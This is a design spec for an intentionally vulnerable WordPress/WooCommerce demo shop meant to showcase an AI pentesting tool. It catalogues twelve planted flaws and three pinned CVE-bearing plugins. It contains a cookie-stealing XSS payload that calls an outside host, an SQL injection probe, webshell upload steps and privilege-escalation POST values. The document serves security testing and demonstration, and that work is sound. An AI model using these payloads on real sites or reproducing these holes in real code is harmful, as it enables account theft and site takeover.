# ChronoMart
### "Authentic handcrafted artifacts from every era you haven't lived in yet."

A WooCommerce marketplace for time-displaced collectibles, future-dated lottery tickets, and pre-natal celebrity memorabilia. Every listing carries a Temporal Warranty (tm). Every plugin carries a CVE.

---

## Premise & Vibe

ChronoMart is the seedy back-alley Etsy of the multiverse. Sellers peddle vials of "authentic Roman dust" (sourced 79 AD, Pompeii-adjacent), sealed envelopes labeled "letter from your future self — DO NOT OPEN BEFORE YOUR 40th BIRTHDAY," lottery tickets dated next Tuesday, and handwritten autographs from celebrities the present hasn't produced yet. Each product page proudly displays the seller's Temporal Warranty: a guarantee that if the item fails to arrive in your correct timeline, ChronoMart will refund the purchase in pre-decimal currency of your choice.

The site is held together by spit, duct tape, and a stack of WordPress plugins the founder installed at 3am after a binge-watch of paradox documentaries. The marketing copy reads like a 1950s pulp magazine. The codebase reads like a 2014 freelancer's portfolio. The two are perfectly compatible.

Tone target for product copy: Weird Tales meets Etsy seller bio. Tone target for the spec: dry, technical, accurate.

---

## Why This Stack

WordPress plus WooCommerce is the natural habitat of small-business e-commerce, and it is the natural habitat of bad plugin code. A pentest demo on this stack hits two things at once:

1. **Real third-party plugin CVEs.** The WordPress plugin ecosystem ships with a steady drip of public, exploitable, CVE-numbered bugs. Apex's `webSearch` tool and `/operator` mode get to do what real operators do: pivot from version-fingerprinting to public exploit research to weaponized payload in one fluid motion.
2. **Custom plugin bugs that look like real custom plugin bugs.** Every WordPress shop has at least one in-house plugin glued together by a contractor who learned `register_rest_route` the day before they shipped it. The bug catalog in this demo is drawn straight from the OWASP+WPScan top hits.

WordPress is also a target where Apex's WordPress-specific audit module (manifest fingerprinting, `readme.txt` version pulls, `/wp-json/` enumeration, theme/plugin path discovery) gets to do real work.

---

## Stack Details

| Layer | Choice | Notes |
|---|---|---|
| OS | Debian 12 (container) | minimal, ships in docker-compose |
| Web | nginx 1.24 | fastcgi to php-fpm |
| PHP | 8.2 (php-fpm) | with `mysqli`, `curl`, `gd`, `mbstring`, `zip` |
| DB | MySQL 8.0 | single-DB layout, default `wp_` prefix |
| WordPress | 6.4.x | core itself patched; the plugin soup is not |
| WooCommerce | 8.5.x | products, cart, checkout, REST |
| Theme | `chronomart` (custom) | child theme of Storefront |
| Cache | LiteSpeed Cache 6.3.0.1 | **pinned vulnerable** |
| Page builder | Bricks 1.9.6 | **pinned vulnerable** (theme + builder) |
| File manager | WP File Manager 6.8 | **pinned vulnerable** |
| Custom plugins | `chronomart-core`, `chronomart-warranty`, `chronomart-attrs` | intentional bugs |
| Mail | Mailhog | for password reset capture in demo |
| TLS | self-signed | Apex tolerates, prints warning |

`docker-compose.yml` brings up: `nginx`, `php-fpm`, `mysql`, `mailhog`, `wordpress-init` (one-shot WP-CLI seeder).

---

## Architecture

```
                     +----------------+
   browser  ---->    |   nginx :443   |
                     +--------+-------+
                              |
                  fastcgi_pass | unix:/run/php-fpm.sock
                              v
                     +--------+-------+        +----------+
                     |   php-fpm 8.2  | <----> |  MySQL   |
                     |  WordPress 6.4 |        |   8.0    |
                     +--------+-------+        +----------+
                              |
              +---------------+----------------+
              |               |                |
     wp-content/plugins   wp-content/uploads   wp-content/themes/chronomart
       woocommerce/         (writable, php-     functions.php
       litespeed-cache/      executable in
       bricks/               misconfigured
       wp-file-manager/      nginx location)
       chronomart-core/
       chronomart-warranty/
       chronomart-attrs/
```

nginx is configured with one footgun on purpose: `/wp-content/uploads/` does not have a `location` block disabling PHP execution. This is a real and common misconfiguration pattern (the canonical hardening is to add `location ~* /wp-content/uploads/.*\.php$ { deny all; }`). Apex should call this out as a finding independent of the upload bug.

The PHP container's webroot is `/var/www/html`. A leftover `wp-config.php~` (editor backup) lives there with valid DB credentials and the eight WordPress salts.

---

## Data Model

WordPress core tables (`wp_users`, `wp_usermeta`, `wp_posts`, `wp_postmeta`, `wp_options`, `wp_comments`, `wp_terms`) plus WooCommerce tables (`wp_wc_orders`, `wp_wc_order_addresses`, `wp_wc_product_meta_lookup`, `wp_woocommerce_sessions`).

Custom tables added by `chronomart-warranty`:

```sql
CREATE TABLE wp_chronomart_warranties (
  id           BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  order_id     BIGINT UNSIGNED NOT NULL,
  product_id   BIGINT UNSIGNED NOT NULL,
  customer_id  BIGINT UNSIGNED NOT NULL,
  era_from     VARCHAR(64) NOT NULL,   -- e.g. "1923-04-01"
  era_to       VARCHAR(64) NOT NULL,   -- e.g. "+infty"
  paradox_clause TEXT,                 -- free text, rendered as HTML on receipt
  signed_hash  VARCHAR(64),            -- md5() of order_id . secret. yes, md5.
  created_at   DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE wp_chronomart_temporal_log (
  id          BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  user_id     BIGINT UNSIGNED,
  action      VARCHAR(64),
  ip          VARCHAR(45),
  payload     LONGTEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

Custom usermeta keys added by `chronomart-core` on registration:

| meta_key | meta_value | notes |
|---|---|---|
| `chronomart_tier` | `traveler` / `chrononaut` / `paradox_admin` | tier set from POST param at registration. yes. |
| `chronomart_origin_year` | int | flavor only |
| `chronomart_warranty_credits` | int | spendable credits |

A WooCommerce product attribute `pa_temporal_origin` ("Year of Origin") is rendered through a custom shortcode on the single-product page.

---

## Key Routes / Surfaces

### WordPress core endpoints (relevant)

| Path | Method | Notes |
|---|---|---|
| `/wp-login.php` | GET/POST | standard login |
| `/wp-admin/` | GET | admin redirect |
| `/wp-admin/admin-ajax.php` | POST | AJAX bus, `?action=` |
| `/wp-json/` | GET | REST root, lists namespaces |
| `/wp-json/wp/v2/users` | GET | **enumeration source** |
| `/wp-json/wp/v2/users?per_page=100` | GET | bulk enum |
| `/?author=1`, `/?author=2` ... | GET | classic author enum redirect |
| `/wp-cron.php` | GET | cron pinger |
| `/xmlrpc.php` | POST | XML-RPC, `system.multicall` allowed |
| `/wp-content/uploads/YYYY/MM/...` | GET | uploads, **php exec enabled** |
| `/readme.html` | GET | core version disclosure |

### WooCommerce endpoints

| Path | Method | Notes |
|---|---|---|
| `/shop/` | GET | catalog |
| `/product/<slug>/` | GET | single product |
| `/cart/`, `/checkout/`, `/my-account/` | GET/POST | standard |
| `/wp-json/wc/store/v1/products` | GET | Store API, public |
| `/wp-json/wc/store/v1/cart` | GET/POST | Store API, nonce-gated |
| `/wp-json/wc/v3/orders` | GET | requires WC consumer key/secret |
| `/?wc-ajax=add_to_cart` | POST | classic AJAX |

### Custom plugin endpoints

| Path | Method | Plugin | Notes |
|---|---|---|---|
| `/wp-json/chronomart/v1/warranty/<id>` | GET | warranty | **no permission_callback** |
| `/wp-json/chronomart/v1/warranty/issue` | POST | warranty | **no permission_callback**, takes order_id+era |
| `/wp-json/chronomart/v1/warranty/revoke` | POST | warranty | **no permission_callback** |
| `/wp-json/chronomart/v1/log` | GET | warranty | dumps `wp_chronomart_temporal_log`, no auth |
| `/wp-admin/admin-ajax.php?action=cm_redeem_credits` | POST | core | **weak nonce check**, uses `==` |
| `/wp-admin/admin-ajax.php?action=cm_upload_proof` | POST | core | media-library upload, **client-trusted MIME** |
| `/?cm_search=<q>&cm_era=<e>` | GET | core | shortcode `[chronomart_browse]`, **SQLi in `cm_era`** |
| `/wp-admin/admin-ajax.php?action=cm_render_attr` | POST | attrs | renders `pa_temporal_origin`, **stored XSS** |
| `/wp-config.php~` | GET | (none) | editor backup, served by nginx |

### Third-party plugin endpoints (vulnerable)

| Path | Plugin / Version | CVE |
|---|---|---|
| `/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php` | WP File Manager 6.8 | CVE-2020-25213 |
| `/?brick=...&_brick_php_query=...` (front-end RCE path) | Bricks 1.9.6 | CVE-2024-25600 |
| `/wp-admin/admin-ajax.php?action=litespeed_*` (+ `litespeed_role`/`litespeed_hash` cookies) | LiteSpeed Cache 6.3.0.1 | CVE-2024-28000 |

---

## Auth Model

- **Anonymous.** Browse catalog, view products, view warranties (because of the bug), use Store API for cart.
- **Customer (`subscriber` + WooCommerce `customer`).** Place orders, view own orders, redeem credits.
- **Chrononaut (`chronomart_chrononaut`).** Custom role added by core plugin. Can list orders for a date range. No real admin powers, but trusted by the warranty plugin's role check.
- **Paradox Admin (`administrator`).** Full WP admin.
- **Service.** WooCommerce REST consumer key/secret pair stored in `wp_options` for an internal fulfillment script.

Sessions are standard WP cookies (`wordpress_logged_in_*`). The custom `chronomart_tier` usermeta is **set from the registration POST body** rather than computed server-side. A registrant who POSTs `chronomart_tier=paradox_admin` ends up with that meta. The warranty plugin reads that meta directly to gate warranty issuance — but never checks the actual WP role. So the meta itself is a privilege grant.

Nonces are present but checked sloppily. `wp_verify_nonce()` is the right call. The custom code uses `$_POST['_n'] == get_option('cm_current_nonce')` instead, with `==` and a short-lived option. This is both type-juggleable and stale-friendly.

---

## Intentional Vulnerabilities

Twelve in-scope findings. Severity per CVSS 3.1 base.

### Critical

| # | Finding | Location | CVSS | Notes |
|---|---|---|---|---|
| C1 | **Unauthenticated arbitrary file upload to RCE** (CVE-2020-25213) | `wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php` | 9.8 | WP File Manager 6.8. elFinder connector is reachable without auth; upload `.php` into plugin lib dir; execute. Public PoC exists. |
| C2 | **Unauthenticated RCE via `eval()`** (CVE-2024-25600) | Bricks 1.9.6 — `Bricks\Query::prepare_query_vars_from_settings`, `$php_query_raw` reaches `eval()` | 9.8 | Hits a public REST/AJAX path; payload is PHP code in a query var. Public PoC exists. |
| C3 | **Unauthenticated privilege escalation** (CVE-2024-28000) | LiteSpeed Cache 6.3.0.1 role-simulation hash | 9.8 | Brute-force or log-leak the `litespeed_hash`, set `litespeed_role` cookie to admin user id, create a new admin via `/wp-json/wp/v2/users`. |
| C4 | **REST auth bypass — missing `permission_callback`** | `chronomart-warranty/rest.php` — `register_rest_route('chronomart/v1','/warranty/issue', [...])` with no `permission_callback` | 9.1 | Anyone can issue, revoke, or read warranties. WP 5.5+ logs a `_doing_it_wrong` notice but still routes. Lets attacker mint warranties for arbitrary `order_id`. |

### High

| # | Finding | Location | CVSS | Notes |
|---|---|---|---|---|
| H1 | **Unrestricted file upload via media library, MIME client-trusted** | `chronomart-core/ajax/upload-proof.php` — `wp_handle_upload` called with `test_type => false`, MIME pulled from `$_FILES['file']['type']` | 8.8 | Combined with the nginx misconfig (PHP exec under `/wp-content/uploads/`), uploaded `.php` runs. Auth required (subscriber+) so this is High not Critical. |
| H2 | **SQL injection in custom shortcode** | `chronomart-core/shortcodes.php` — `[chronomart_browse]` builds `"...AND meta_value = '" . $_GET['cm_era'] . "'"` then `$wpdb->get_results($sql)` | 8.6 | Classic stacked string concat. UNION-based extraction; the `cm_search` param is properly prepared, the `cm_era` param is not. |
| H3 | **Privilege escalation via mass-assigned usermeta on registration** | `chronomart-core/register.php` — `update_user_meta($user_id, 'chronomart_tier', $_POST['chronomart_tier'])` runs on `user_register` action | 8.8 | Sending `chronomart_tier=paradox_admin` in the registration form bypasses every later capability check the plugin does. Warranty plugin honors this meta as if it were a role. |
| H4 | **Exposed `wp-config.php~` backup with DB creds + salts** | `/var/www/html/wp-config.php~` | 7.5 | nginx serves dotfiles and `~`-suffixed files by default. Contains `DB_PASSWORD`, `AUTH_KEY`, `LOGGED_IN_KEY`, etc. Salts allow forging cookies offline. |

### Medium

| # | Finding | Location | CVSS | Notes |
|---|---|---|---|---|
| M1 | **Weak nonce check using `==` against stored option** | `chronomart-core/ajax/redeem.php` — `if ($_POST['_n'] == get_option('cm_current_nonce'))` | 6.5 | Type-juggling: a `0`-prefixed `0e...` string can match. Also the option doesn't rotate per-user. Lets a logged-in attacker drain another user's credits. |
| M2 | **Stored XSS in custom product attribute display** | `chronomart-attrs/render.php` — outputs `pa_temporal_origin` raw via `echo $term->name` inside an HTML attribute | 6.4 | Vendor sets attribute term to `"><script>fetch('//x/?c='+document.cookie)</script>`. Renders on every product page that uses the attribute. |
| M3 | **REST user enumeration via `/wp-json/wp/v2/users`** | core; `rest_user_query` not filtered | 5.3 | Returns `id`, `slug`, `name` for every user with published posts. Slugs become login names. Feeds H3 + C3 + brute-force. |

### Low

| # | Finding | Location | CVSS | Notes |
|---|---|---|---|---|
| L1 | **WordPress + plugin version disclosure via `readme.txt` / `style.css` / generator meta** | `/readme.html`, `/wp-content/plugins/*/readme.txt`, `<meta name="generator">` | 3.7 | Required for the demo: lets Apex fingerprint exact plugin versions and pivot to CVE lookups. |
| L2 | **nginx serves `*~` and dotfiles in webroot** | nginx default `server` block, no `location ~ /\.` deny | 5.3 | Independent of H4 — class issue. Apex flags pattern, even if no live `~` files exist. |

(Twelve total. C1–C4, H1–H4, M1–M3, L1–L2. L2 is the framing of the misconfig that enables H4 and amplifies H1.)

---

## Real-World Parallels

- **CVE-2020-25213 (WP File Manager).** Mass-exploited in late 2020 against ~700K WordPress sites. The "renamed elFinder example connector" is a textbook unsafe-defaults footgun.
- **CVE-2024-25600 (Bricks Builder).** February 2024. Active exploitation began within ~24 hours of public disclosure. Pure `eval()` of attacker-controlled query var.
- **CVE-2024-28000 (LiteSpeed Cache).** August 2024. ~5M installs at risk. Demonstrates how a "cache plugin" can ship a role-simulation feature that becomes a full auth bypass.
- **REST `permission_callback` bypass (C4).** Most-recommended WPScan finding pattern. Real-world: dozens of small plugins per quarter ship routes without callbacks; WordPress core warns but does not refuse.
- **Mass-assigned usermeta (H3).** Pattern observed in many membership/loyalty plugins. The "register with `role=admin`" shortcut is folklore but every year someone ships it.
- **MIME client-trust + uploads-exec (H1).** The combination is the classic shared-hosting compromise vector. Hardening is well-known; many sites still miss it.
- **Stored XSS in product attribute (M2).** Marketplaces with seller-controlled attribute values are perennial victims. Real WooCommerce extensions have shipped this.
- **`wp-config.php~` (H4).** Comes from editing on the server with `vim` or `nano` and not cleaning up. Still found in the wild every week.

---

## Apex Features Showcased

- **WordPress-specific plugin audit.** Manifest fetch (`readme.txt`, `style.css`, `package.json` if present), version pin extraction, slug-to-CVE lookup. Triggered by the `/pentest` planner upon detecting `<meta name="generator" content="WordPress 6.4...">` or `wp-content/` paths.
- **`webSearch` tool finding CVE writeups in real time.** When the audit module finds `litespeed-cache 6.3.0.1`, Apex's `webSearch` retrieves the WPScan / Patchstack / Wordfence writeup, summarizes the exploitation prereqs, and feeds them back into the planner. Same for File Manager 6.8 and Bricks 1.9.6.
- **`/operator` mode with public-exploit-DB integration.** Operator pulls PoCs (Exploit-DB, GitHub) for the three CVEs, sandboxes them, runs them against the local target, and captures the resulting webshell session.
- **Swarm.** Parallel agents: one runs the third-party CVE chain, one fuzzes the custom REST namespace `/wp-json/chronomart/v1/`, one does WP-core surface checks (xmlrpc multicall, user enum, login probe).
- **Findings + CVSS + judge.** Each of the 12 findings produces a Finding record with reproduction steps, evidence (HTTP transcript), CVSS vector, and judge-score for impact. Duplicates between the swarm agents (e.g. two ways to reach RCE) get merged by the judge.
- **Patching agent.** Generates a PR-shaped diff against the custom plugins (adds `permission_callback`, swaps `==` for `wp_verify_nonce`, prepares the SQL with `$wpdb->prepare`, escapes the attribute term with `esc_attr`). For third-party plugins, generates an `composer.json` / `wp-cli` upgrade command rather than a code patch.
- **Memory.** Remembers ChronoMart's plugin set + version pins across sessions; second run skips re-fingerprint and goes straight to the chain.
- **Threat-model module.** Builds a one-page threat model from the manifest: "marketplace, customer PII, payment intent stored in WC, admin takeover surface = X." Used to prioritize which finding to chain first.
- **Attack-surface + JS endpoint extraction.** Crawls the storefront, extracts `/wp-json/chronomart/v1/...` from minified JS bundles in the theme, and feeds them to the REST fuzzer.
- **Playwright.** Drives `/my-account/`, registers a new customer with `chronomart_tier=paradox_admin`, screenshots the resulting admin bar.
- **TUI.** Live finding list updates as agents land; the demo screen recording focuses on the moment the third critical lights up.

---

## Demo Storyline

A ~6-minute recorded run, scripted in three acts.

### Act 1 — Recon and fingerprint (0:00–1:30)

1. Operator: `apex pentest https://chronomart.local --scope wordpress`.
2. Apex hits `/`, sees the WP generator meta and `wp-content/` paths, switches into WordPress mode.
3. WP audit module fetches `readme.html`, `/wp-content/plugins/litespeed-cache/readme.txt`, `/wp-content/plugins/wp-file-manager/readme.txt`, `/wp-content/themes/bricks/style.css`. Pins versions: WP 6.4.x, LiteSpeed 6.3.0.1, WP File Manager 6.8, Bricks 1.9.6.
4. `webSearch` fires three queries: `"LiteSpeed Cache 6.3.0.1 CVE"`, `"WP File Manager 6.8 CVE"`, `"Bricks 1.9.6 CVE"`. Returns CVE-2024-28000, CVE-2020-25213, CVE-2024-25600 with writeups.
5. `/wp-json/wp/v2/users` enumerates `admin`, `chronowner`, `fulfillment`, plus six customer slugs. (M3, L1.)

### Act 2 — Custom plugin hunt, parallel (1:30–3:30)

6. Swarm agent A targets the custom REST namespace. Hits `/wp-json/chronomart/v1/log` unauthenticated — gets the temporal log (C4). Mints a warranty for `order_id=9999` it doesn't own.
7. Swarm agent B opens a product page, spots `[chronomart_browse]` rendering, fuzzes `cm_era` with `' OR 1=1-- -`, gets boolean differential, escalates to UNION-based extraction of `wp_users` (H2).
8. Swarm agent C registers a new account via `/wp-login.php?action=register` with `chronomart_tier=paradox_admin` in the POST body. Logs in. Warranty plugin now treats this account as privileged (H3).
9. Swarm agent D crawls webroot for editor leftovers, gets `200 OK` on `wp-config.php~`. Pulls DB credentials and salts (H4, L2).
10. Findings tile lights up: 4 high+ in 90 seconds.

### Act 3 — Operator mode and the chain (3:30–5:30)

11. Operator switches to `/operator`. Apex proposes three independent paths to admin:
    - **Path A (Bricks).** Send the public CVE-2024-25600 PoC; one HTTP request returns shell output.
    - **Path B (LiteSpeed).** Brute-force `litespeed_hash` cookie at low rate, then create admin via `/wp-json/wp/v2/users`.
    - **Path C (File Manager).** elFinder upload of `shell.php` into `wp-content/plugins/wp-file-manager/lib/files/`, then GET it.
12. Operator picks Path A for cinematic value. One request, one webshell. Apex captures stdout, cleans up, takes a screenshot.
13. Patching agent generates two artifacts: (a) `composer.json` + `wp-cli` upgrade plan covering the three CVE-bearing plugins, with version pins; (b) source-level diffs for the three custom plugins fixing C4, H1, H2, H3, M1, M2.
14. Closing TUI screen: 12 findings, severity ladder, time-to-first-RCE: 4m11s.

### Act 4 — Outro (5:30–6:00)

15. Apex memory writes a project record: `chronomart.local — WP 6.4 + WC 8.5 + 3 vulnerable plugins + 8 custom bugs`. Next run skips fingerprint.
16. Closing card: "Temporal Warranty void where prohibited."

---

## Build Notes

Estimated 3-5 days for a single engineer + one designer.

**Day 1 — Stack + WP install.**
- `docker-compose.yml` with nginx, php-fpm 8.2, mysql 8, mailhog.
- nginx vhost: webroot `/var/www/html`, no deny on `~`/dotfiles, no PHP-exec deny in `/wp-content/uploads/`.
- WP-CLI seeder (`wordpress-init` one-shot): `core download`, `core install`, set salts, install + activate WC, install + activate the three pinned third-party plugins **at the vulnerable versions** (WP File Manager 6.8, LiteSpeed 6.3.0.1, Bricks 1.9.6), install custom theme + three custom plugins.

**Day 2 — Custom plugins.**
- `chronomart-core/`: registration handler (H3), `cm_redeem_credits` AJAX (M1), `cm_upload_proof` AJAX (H1), `[chronomart_browse]` shortcode (H2).
- `chronomart-warranty/`: REST namespace `/wp-json/chronomart/v1/` with five routes, none with `permission_callback` (C4). Custom tables in plugin activation hook.
- `chronomart-attrs/`: shortcode + AJAX renderer that echoes `pa_temporal_origin` raw (M2).

**Day 3 — Content + WooCommerce seed.**
- WP-CLI: create six customer accounts, two seller accounts, one administrator, one chrononaut.
- Seed 30 products with the pulp-flavor titles ("Authentic Roman Dust 12g," "Letter From Your Future Self," "Lottery Ticket — Powerball 2026-05-09," "Pre-Birth Autograph: T. Swift v2"). Each gets a temporal warranty record.
- Seed one product with attribute term containing the stored XSS payload (M2).
- Drop `wp-config.php~` into webroot (H4). Drop a fake editor swap file too for color.

**Day 4 — Smoke + tuning.**
- Manual run of all 12 findings end-to-end. Capture HTTP transcripts.
- Apex run against the stack: confirm all 12 land, swarm timing reasonable, no flakes.
- Tune product images + theme polish so screenshots look like a real (silly) Etsy clone.

**Day 5 — Recording + reset script.**
- `bin/reset.sh`: drops the DB, re-runs the seeder, restores the `~` backup. Idempotent; runs <30s.
- Record the storyline. Re-run reset between takes.
- Optional: a `--safe` flag for the docker-compose that disables the PHP-exec-in-uploads misconfig, for users who want to clone the repo without the live RCE.

**Pinning safety.** All three vulnerable plugin zips are checked in under `seed/plugins/` rather than fetched from the live WP plugin directory. The plugin directory may not still serve old versions, and we want the demo reproducible offline.

**Data realism.** Customer addresses use fake-but-plausible US/UK/JP addresses generated with Faker. Order totals look like real WooCommerce orders. The temporal origin strings are weird on purpose ("1923-04-01 to +infty").

---

## Recording Notes

- Resolution: 1920x1080. Terminal at 14pt monospace, dark bg.
- Two panes: left = Apex TUI, right = browser at `https://chronomart.local`.
- Cold-open on the homepage. Linger for 2s on the product grid so viewers register that this is a shop.
- Cut to terminal for the `apex pentest` command.
- When Apex's `webSearch` runs, briefly overlay the WPScan / Patchstack page being fetched — viewers should see this is real CVE research, not magic.
- When the Bricks PoC fires, switch the right pane to a curl one-liner showing the request and the `id` output. This is the money shot.
- End on the TUI findings table sorted by severity, with the patching-agent diff scrolling on the right.
- Audio: dry voiceover. Resist the urge to play 1950s sci-fi music; the joke is funnier without.
- Lower-third on screen: "ChronoMart — Temporal Warranty void where prohibited. Plugins also void." Hold 2s. End card.

---

Sources used for CVE research:
- [CVE-2020-25213 — WP File Manager <= 6.8 — WPScan](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/)
- [CVE-2020-25213 — Patchstack](https://patchstack.com/database/wordpress/plugin/wp-file-manager/vulnerability/wordpress-file-manager-plugin-6-8-unauthenticated-arbitrary-file-upload-leading-to-rce-vulnerability)
- [CVE-2024-28000 — LiteSpeed Cache <= 6.3.0.1 — Patchstack](https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-3-0-1-unauthenticated-privilege-escalation-vulnerability)
- [CVE-2024-28000 — Wordfence writeup](https://www.wordfence.com/blog/2024/08/over-5000000-site-owners-affected-by-critical-privilege-escalation-vulnerability-patched-in-litespeed-cache-plugin/)
- [CVE-2024-25600 — Bricks <= 1.9.6 — Patchstack](https://patchstack.com/database/vulnerability/bricks/wordpress-bricks-theme-1-9-6-unauthenticated-remote-code-execution-rce-vulnerability)
- [CVE-2024-25600 — snicco disclosure](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)
